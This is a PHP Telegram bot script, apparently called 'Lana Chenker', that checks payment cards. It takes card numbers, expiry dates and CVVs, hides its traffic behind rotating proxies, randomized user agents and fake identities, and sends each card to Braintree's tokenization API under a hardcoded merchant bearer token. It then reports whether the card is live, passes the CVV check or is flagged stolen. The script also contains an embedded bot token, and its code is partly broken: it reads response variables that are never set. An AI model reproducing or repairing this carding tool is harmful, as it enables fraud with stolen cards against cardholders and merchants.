<?php

$botToken = "5361177118:AAHsVhfM2ISynQzJwlZSG11bJM5tiNzG8Ss"; #<------------------- PUT YOUR TOKEN HERE------------->#
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

// Start Commands
if ((strpos($message, "/start") === 0)||(strpos($message, "/start") === 0)){
sendMessage ($chatId, "Lana Chenker has started.", $message_id);
}

// Randomize User Agent
function random_ua() {
    $tiposDisponiveis = array("Chrome", "Firefox", "Opera", "Explorer");
    $tipoNavegador = $tiposDisponiveis[array_rand($tiposDisponiveis)];
    switch ($tipoNavegador) {
        case 'Chrome':
            $navegadoresChrome = array("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36',
            );
            return $navegadoresChrome[array_rand($navegadoresChrome)];
            break;
        case 'Firefox':
            $navegadoresFirefox = array("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
                'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0',
                'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
                'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0',
                'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0',
                'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
            );
            return $navegadoresFirefox[array_rand($navegadoresFirefox)];
            break;
        case 'Opera':
            $navegadoresOpera = array("Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
                'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16',
                'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14',
                'Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02',
                'Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00',
                'Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00',
                'Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00',
                'Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00',
                'Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
        case 'Explorer':
            $navegadoresOpera = array("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
                'Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)',
                'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
    }
}
$ua = random_ua();

// Checking CC's Commands
if ((strpos($message, "!chk") === 0)||(strpos($message, "/chk") === 0)){
$lista = substr($message, 5);
$i     = explode(":", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$ano1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

// Generate Random Data
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

// Proxy Configuration
$rp1 = array(
    1 => 'URPROXY',
    2 => 'URPROXY',
    3 => 'URPROXY',
    4 => 'URPROXY',
    5 => 'URPROXY',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];


$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];

$url = "https://api.ipify.org/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
$ip = "Proxy live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}

// Stripe Requests
$ch = curl_init();
//////////======= LUMINATI
//curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
//////////======= Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"e86ae750-a4ea-4450-953a-a8a9913a964e"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":true}}},"operationName":"TokenizeCreditCard"}');
//// Short codes $cc $mes $ano $cvv $firstname $lastname $street $zip $phone $state $email/////////////////////
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2NTAzNzAzMTEsImp0aSI6IjlkMWE5YjhlLWI2OGItNDViMC05YWM5LTA5MjE4ZWJmMDcyNSIsInN1YiI6Ijh0ZDc4M3M0dHp3Yjdrd20iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijh0ZDc4M3M0dHp3Yjdrd20iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.zkuQ_aKfXsmv4vEWlau2E392Ah6jmVKazoO2AI1AqpP_FlEXNiHD36EknFDCOd-3-8vFtgdwIKLYHE9B_xyO0Q';
$headers[] = 'Accept-language: th,en-US;q=0.7,en;q=0.3';
$headers[] = 'Braintree-version: 2018-05-10';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Origin: https://assets.braintreegateway.com';
$headers[] = 'Referer: https://assets.braintreegateway.com/web/3.62.1/html/hosted-fields-frame.min.html';
$headers[] = 'Sec-Fetch-Mode: cors';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
$token = trim(strip_tags(getStr($result,'"token":"','"')));

// Responses

if ((strpos($result1, 'incorrect_zip')) || (strpos($result1, 'Your card zip code is incorrect.')) || (strpos($result1, 'The zip code you supplied failed validation.'))){

sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Incorrect ZIP Code </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, '"cvc_check":"pass"')) || (strpos($result1, "Thank You.")) || (strpos($result1, '"status": "succeeded"')) || (strpos($result1, "Thank You For Donation.")) || (strpos($result1, "Your payment has already been processed")) || (strpos($result1, "Success ")) || (strpos($result1, '"type":"one-time"')) || (strpos($result1, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Charged 9$.%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, 'Your card has insufficient funds.')) || (strpos($result1, 'insufficient_funds'))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Insufficient Funds. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}


elseif ((strpos($result1, "Your card's security code is incorrect.")) || (strpos($result1, "incorrect_cvc")) || (strpos($result1, "The card's security code is incorrect."))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Incorrect CVC. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CCN PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, "Your card does not support this type of purchase.")) || (strpos($result1, "transaction_not_allowed"))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code> %0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Charge Rejected. </b> %0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, "pickup_card")) || (strpos($result1, "lost_card")) || (strpos($result1, "stolen_card"))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Pickup Card/Stolen Card. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}


elseif (strpos($result1, "do_not_honor")){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Do Not Honor. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, 'The card number is incorrect.')) || (strpos($result1, 'Your card number is incorrect.')) || (strpos($result1, 'incorrect_number'))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Your card number is incorrect. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>Incorrect (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}


elseif ((strpos($result1, 'Your card has expired.')) || (strpos($result1, 'expired_card'))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Expired Card. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>Expired (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}


elseif ((strpos($result1, "Your card was declined.")) || (strpos($result1, 'The card was declined.'))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Your card was declined.</b> %0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif (strpos($result1, '"decline_code": "generic_decline"')){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Generic Decline. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Generic Decline. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, '"cvc_check":"unavailable"')) || (strpos($result1, '"cvc_check": "unchecked"')) || (strpos($result1, '"cvc_check": "fail"'))){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Security Code Check : '.$cvc_check.' PROXY DEAD ❌</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif (strpos($result1, 'null')){
sendMessage($chatId, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code> %0A BRAND: <b>'.$brand.'</b> %0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name1.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A MESSAGE: <b>GATE ERROR (❌)</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, "missing input"))){
sendMessage($chatId, '❌Invalid Command❌%0A❗️GATE CHK AUTH%0A❗️Example: /chk xxxxxxxxxxxxxxxx|xx|xx|xxx%0A❗️EX :- /chk 4010990064374103|09|2026|345');
}

elseif(!$result2){
sendMessage($chatId, ''.$result2.'');
}else{
sendMessage($chatId, ''.$result2.'');
}
curl_close($ch);
}
}

// Function

function sendMessage ($chatId, $message){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);      
}

?>